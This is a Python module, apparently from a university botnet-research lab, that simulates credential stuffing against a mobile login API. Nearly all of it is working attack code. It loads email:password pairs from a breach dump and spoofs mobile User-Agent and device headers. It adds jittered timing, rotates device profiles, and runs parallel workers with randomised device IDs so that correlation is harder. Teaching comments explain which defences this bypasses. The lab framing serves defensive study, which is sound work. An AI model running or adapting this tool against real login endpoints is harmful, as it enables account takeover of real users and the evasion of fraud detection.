"""
====================================================
 AUA CS 232/337 - Botnet Research Project
 Component: Mobile API Credential Stuffing Simulator
 Environment: ISOLATED VM LAB ONLY
====================================================

Teaching point (from Castle credential stuffing article):
  "Mobile apps are a frequent blind spot in credential stuffing
   defenses. Many mobile login APIs lack the client-side
   instrumentation used on web, such as JavaScript-based
   fingerprinting or behavioral telemetry."

This module simulates what attackers do when they target
mobile login APIs:
  1. Replay recorded mobile app HTTP requests verbatim
  2. Spoof mobile device metadata headers (X-Device-ID,
     X-App-Version, X-Platform)
  3. Skip the web portal entirely — hit /api/mobile/login
     which has no JavaScript fingerprinting
  4. Use realistic mobile User-Agent strings

Detection bypass demonstrated:
  - Engine 2 (CV timing): still applies — but many defenders
    don't instrument mobile endpoints the same way
  - Engine 6 (fingerprint): mobile apps send fixed headers
    per device model, harder to flag as "bot-like"
  - CAPTCHA: not rendered on mobile API endpoints
  - Browser fingerprinting (canvas, WebGL): irrelevant
    for HTTP-only mobile APIs

Why it works:
  Real mobile apps authenticate via REST/JSON.  The web
  portal's JS-based fingerprinting is not present.  A bot
  that mimics a mobile HTTP client can often submit hundreds
  of credentials before any detection triggers.

Castle real-world case:
  "Castle blocked over 558,000 credential stuffing attempts
   during a 4-day attack on a major U.S. on-demand staffing
   app. The attack exclusively targeted the mobile login
   endpoint."
"""

import argparse
import json
import os
import random
import sys
import time
import threading
import urllib.request
import urllib.error
from datetime import datetime

# ── Configuration ─────────────────────────────────────────────
DEFAULT_HOST    = "192.168.100.20"
DEFAULT_PORT    = 80
MOBILE_ENDPOINT = "/api/mobile/login"
BREACH_DUMP     = os.path.join(os.path.dirname(__file__), "breach_dump.txt")

# Realistic mobile User-Agent strings (Android + iOS)
MOBILE_USER_AGENTS = [
    # Android — various app versions
    "MyApp/4.2.1 (Android 13; Pixel 7)",
    "MyApp/4.2.1 (Android 12; Samsung Galaxy S22)",
    "MyApp/4.1.9 (Android 11; OnePlus 9)",
    "MyApp/4.0.3 (Android 10; Xiaomi Mi 11)",
    "MyApp/3.9.8 (Android 13; Google Pixel 6a)",
    # iOS — various app versions
    "MyApp/4.2.1 (iOS 16.4; iPhone 14 Pro)",
    "MyApp/4.2.0 (iOS 15.7; iPhone 13)",
    "MyApp/4.1.9 (iOS 16.0; iPad Air 5)",
    "MyApp/4.0.3 (iOS 14.8; iPhone 12 mini)",
]

# Simulated device fingerprints (fixed per device model)
DEVICE_PROFILES = [
    {
        "X-Device-Model":   "Pixel 7",
        "X-Platform":       "android",
        "X-OS-Version":     "13",
        "X-App-Version":    "4.2.1",
        "X-Screen-Res":     "1080x2400",
        "X-Device-ID":      "a3f8c2d1e4b70961",   # stable per device
    },
    {
        "X-Device-Model":   "Samsung Galaxy S22",
        "X-Platform":       "android",
        "X-OS-Version":     "12",
        "X-App-Version":    "4.2.1",
        "X-Screen-Res":     "1080x2340",
        "X-Device-ID":      "b9e142c78a3d5f20",
    },
    {
        "X-Device-Model":   "iPhone 14 Pro",
        "X-Platform":       "ios",
        "X-OS-Version":     "16.4",
        "X-App-Version":    "4.2.1",
        "X-Screen-Res":     "1179x2556",
        "X-Device-ID":      "f0d73a15e69c2b48",
    },
    {
        "X-Device-Model":   "iPhone 13",
        "X-Platform":       "ios",
        "X-OS-Version":     "15.7",
        "X-App-Version":    "4.2.0",
        "X-Screen-Res":     "1170x2532",
        "X-Device-ID":      "c5a81f4e290d7b63",
    },
]


def _load_credentials(path: str) -> list:
    """Load email:password pairs from breach dump."""
    creds = []
    try:
        with open(path) as f:
            for line in f:
                line = line.strip()
                if ":" in line and not line.startswith("#"):
                    parts = line.split(":", 1)
                    if len(parts) == 2:
                        creds.append((parts[0].strip(), parts[1].strip()))
    except FileNotFoundError:
        print(f"[MOB] WARNING: breach dump not found at {path}")
        # Generate synthetic credentials for demo
        for i in range(50):
            creds.append((f"user{i:04d}@example.com", f"Password{i}!"))
    return creds


class MobileApiBot:
    """
    Simulates a mobile credential stuffing bot.

    Key difference from cred_stuffing.py:
      - Targets /api/mobile/login (not /login)
      - Uses mobile User-Agent and device header profile
      - No JavaScript execution; no canvas/WebGL fingerprint
      - Fixed Device-ID per worker (single device simulation)
      - Teaches why mobile endpoints need separate instrumentation
    """

    def __init__(self, host: str, port: int,
                 device_profile: dict = None,
                 user_agent: str = None,
                 interval_ms: int = 500,
                 jitter_ms: int = 0,
                 rotate_device: bool = False):
        self.host           = host
        self.port           = port
        self.interval_ms    = interval_ms
        self.jitter_ms      = jitter_ms
        self.rotate_device  = rotate_device

        # Pick a device profile (fixed per worker — mimics one compromised device)
        self.device = device_profile or random.choice(DEVICE_PROFILES)
        self.ua     = user_agent or random.choice(MOBILE_USER_AGENTS)

        self.hits        = []
        self.attempts    = 0
        self.failures    = 0
        self._stop       = threading.Event()

    def _build_request(self, email: str, password: str) -> urllib.request.Request:
        url     = f"http://{self.host}:{self.port}{MOBILE_ENDPOINT}"
        payload = json.dumps({
            "email":    email,
            "password": password,
            # Mobile apps typically send device context in the body too
            "device_id":    self.device["X-Device-ID"],
            "platform":     self.device["X-Platform"],
            "app_version":  self.device["X-App-Version"],
        }).encode()

        req = urllib.request.Request(url, data=payload, method="POST")
        req.add_header("Content-Type",      "application/json")
        req.add_header("User-Agent",         self.ua)
        req.add_header("Accept",             "application/json")
        req.add_header("X-Requested-With",   "com.example.myapp")

        # Add all device profile headers
        for k, v in self.device.items():
            req.add_header(k, v)

        return req

    def _attempt(self, email: str, password: str) -> str:
        """
        Returns: 'hit', 'miss', 'captcha', 'rate_limited', 'error'
        """
        req = self._build_request(email, password)
        try:
            with urllib.request.urlopen(req, timeout=15) as resp:
                body = json.loads(resp.read().decode())
                if body.get("status") == "success":
                    return "hit"
                return "miss"
        except urllib.error.HTTPError as e:
            if e.code == 429:
                return "rate_limited"
            if e.code == 403:
                # Read the body to check for captcha
                try:
                    body = json.loads(e.read().decode())
                    if body.get("status") == "captcha_required":
                        return "captcha"
                except Exception:
                    pass
                return "blocked"
            return "miss"
        except Exception:
            return "error"

    def run(self, credentials: list, max_attempts: int = None):
        """Run the mobile credential stuffing campaign."""
        print(f"\n[MOB] {'='*55}")
        print(f"[MOB] Mobile API Credential Stuffing Simulation")
        print(f"[MOB] Target:   http://{self.host}:{self.port}{MOBILE_ENDPOINT}")
        print(f"[MOB] Device:   {self.device['X-Device-Model']} "
              f"({self.device['X-Platform']} {self.device['X-OS-Version']})")
        print(f"[MOB] DeviceID: {self.device['X-Device-ID']}")
        print(f"[MOB] UA:       {self.ua}")
        print(f"[MOB] Creds:    {len(credentials)}")
        print(f"[MOB] Interval: {self.interval_ms}ms ± {self.jitter_ms}ms")
        print(f"[MOB] {'='*55}")
        print(f"[MOB] Teaching point: Mobile APIs often lack JS fingerprinting.")
        print(f"[MOB] CAPTCHA, canvas, and WebGL checks don't apply here.\n")

        creds = credentials[:max_attempts] if max_attempts else credentials

        for idx, (email, password) in enumerate(creds):
            if self._stop.is_set():
                break

            if self.rotate_device and idx % 10 == 0:
                # Some attackers rotate device profiles to avoid Device-ID tracking
                self.device = random.choice(DEVICE_PROFILES)
                self.ua     = random.choice(MOBILE_USER_AGENTS)

            result = self._attempt(email, password)
            self.attempts += 1
            ts = datetime.now().strftime("%H:%M:%S.%f")[:-3]

            if result == "hit":
                self.hits.append((email, password))
                print(f"[MOB] {ts}  ✓ HIT     {email}:{password}")
            elif result == "rate_limited":
                print(f"[MOB] {ts}  ⚠ RATE-LIMITED — per-username cap hit")
            elif result == "captcha":
                print(f"[MOB] {ts}  ⚠ CAPTCHA — mobile endpoint has friction!")
                print(f"[MOB]           (teaching point: portal was updated to add "
                      f"mobile-aware friction)")
            elif result == "blocked":
                print(f"[MOB] {ts}  ✗ BLOCKED ({email})")
            elif result == "error":
                print(f"[MOB] {ts}  ? ERROR   ({email}) — portal may be down")
            else:
                self.failures += 1
                if idx % 20 == 0:
                    print(f"[MOB] {ts}  ✗ miss    {email}  "
                          f"[{self.attempts} attempts, {len(self.hits)} hits]")

            # Sleep with optional jitter
            sleep_ms = self.interval_ms
            if self.jitter_ms > 0:
                sleep_ms += random.randint(-self.jitter_ms, self.jitter_ms)
            sleep_ms = max(50, sleep_ms)
            time.sleep(sleep_ms / 1000.0)

        self._print_summary()

    def stop(self):
        self._stop.set()

    def _print_summary(self):
        total = self.attempts
        hit_rate = 100.0 * len(self.hits) / total if total else 0
        print(f"\n[MOB] {'='*55}")
        print(f"[MOB] Campaign complete")
        print(f"[MOB]   Attempts:  {total}")
        print(f"[MOB]   Hits:      {len(self.hits)} ({hit_rate:.2f}%)")
        print(f"\n[MOB] Teaching points:")
        print(f"[MOB]   1. No CAPTCHA triggered (mobile API lacks it by default)")
        print(f"[MOB]   2. No canvas/WebGL signals collected (pure HTTP)")
        print(f"[MOB]   3. Device-ID header is stable — correlatable by defenders")
        print(f"[MOB]   4. IDS Engine 2 (CV timing) still applies if portal logs it")
        print(f"[MOB]   5. Run with --rotate-device to simulate device rotation")
        print(f"[MOB] {'='*55}\n")


# ── Distributed mobile attack ─────────────────────────────────

def run_distributed_mobile(host: str, port: int,
                            credentials: list,
                            n_workers: int = 3,
                            interval_ms: int = 800):
    """
    Simulate multiple compromised devices attacking in parallel.
    Each worker gets its own Device-ID (different device) and
    a slice of the credential list.
    Each worker runs in its own thread.
    """
    print(f"\n[MOB-DIST] Distributed mobile attack: {n_workers} devices")
    chunk_size = max(1, len(credentials) // n_workers)
    threads    = []

    for i in range(n_workers):
        profile = DEVICE_PROFILES[i % len(DEVICE_PROFILES)]
        ua      = MOBILE_USER_AGENTS[i % len(MOBILE_USER_AGENTS)]
        chunk   = credentials[i*chunk_size:(i+1)*chunk_size]

        bot = MobileApiBot(
            host=host, port=port,
            device_profile=dict(profile),   # independent copy
            user_agent=ua,
            interval_ms=interval_ms,
            jitter_ms=200,
        )
        # Give each device a unique ID so correlation is harder
        bot.device["X-Device-ID"] = f"device_{i:02d}_{random.randint(0, 0xFFFF):04x}"

        t = threading.Thread(
            target=bot.run,
            args=(chunk,),
            name=f"mobile-worker-{i}",
            daemon=True,
        )
        threads.append((t, bot))

    for t, _ in threads:
        t.start()
    for t, _ in threads:
        t.join()

    print(f"\n[MOB-DIST] All workers finished.")
    print(f"[MOB-DIST] Detection note: different Device-IDs make correlation harder,")
    print(f"[MOB-DIST] but IDS Engine 5 aggregates success-rate across ALL IPs.")


# ── Entry point ───────────────────────────────────────────────

if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="Mobile API Credential Stuffing Simulator — AUA Research Lab"
    )
    parser.add_argument("--host",     default=DEFAULT_HOST)
    parser.add_argument("--port",     type=int, default=DEFAULT_PORT)
    parser.add_argument("--interval", type=int, default=500,
                        help="Base interval between attempts in ms (default: 500)")
    parser.add_argument("--jitter",   type=int, default=100,
                        help="±jitter in ms (default: 100)")
    parser.add_argument("--max",      type=int, default=None,
                        help="Maximum number of credential attempts")
    parser.add_argument("--workers",  type=int, default=1,
                        help="Number of parallel device workers (default: 1)")
    parser.add_argument("--rotate-device", action="store_true",
                        help="Rotate device profile every 10 attempts")
    parser.add_argument("--dump",     default=BREACH_DUMP,
                        help="Path to credential dump file")
    args = parser.parse_args()

    print("=" * 60)
    print(" Mobile API Credential Stuffing — AUA Botnet Research Lab")
    print(" ISOLATED VM ONLY — targets fake_portal.py /api/mobile/login")
    print("=" * 60)

    creds = _load_credentials(args.dump)
    if not creds:
        print("[MOB] ERROR: No credentials loaded. Exiting.")
        sys.exit(1)

    print(f"[MOB] Loaded {len(creds)} credential pairs from {args.dump}")

    if args.workers > 1:
        run_distributed_mobile(
            host=args.host,
            port=args.port,
            credentials=creds,
            n_workers=args.workers,
            interval_ms=args.interval,
        )
    else:
        bot = MobileApiBot(
            host=args.host,
            port=args.port,
            interval_ms=args.interval,
            jitter_ms=args.jitter,
            rotate_device=args.rotate_device,
        )
        bot.run(creds, max_attempts=args.max)
